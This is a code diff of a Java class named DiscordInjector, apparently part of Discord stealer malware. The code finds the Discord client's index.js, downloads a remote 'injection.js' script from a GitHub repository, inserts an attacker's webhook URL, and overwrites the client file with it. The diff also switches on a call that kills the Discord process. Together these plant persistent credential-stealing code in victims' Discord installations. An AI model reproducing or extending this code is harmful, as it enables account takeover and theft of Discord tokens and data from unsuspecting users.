@@ -35,7 +35,7 @@ public class DiscordInjector {
 
 	@SuppressWarnings(value = {"unused"})
 	public synchronized void initialize() throws Exception {
-		//if (!legitMode) utilities._instance.getDiscordKiller();
+		if (!legitMode) utilities._instance.getDiscordKiller();
 		//if (bettCheck) utilities._instance.getRemoveBetterDcProtection();
 
         Inject: {
@@ -53,7 +53,7 @@ public class DiscordInjector {
                                                 for (File file5 : (new File(String.valueOf(file4))).listFiles(File::isFile)) {
                                                     if ((String.valueOf(file5)).contains("index.js")) {
                                                         Scanner scanner = new Scanner(new URL("https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js").openStream(), StandardCharsets.UTF_8.toString()).useDelimiter("\\A");
-                                                        new File(String.valueOf(file4) + "/initials/").mkdirs();
+                                                        new File(String.valueOf(file4) + "/initiation/").mkdirs();
 														List<String> results = new ArrayList<String>();
                                                         results.add(scanner.next().replace("%WEBHOOK%", webhookURL));
                                                         FileUtils.writeLines(file5, StandardCharsets.UTF_8.toString(), results);
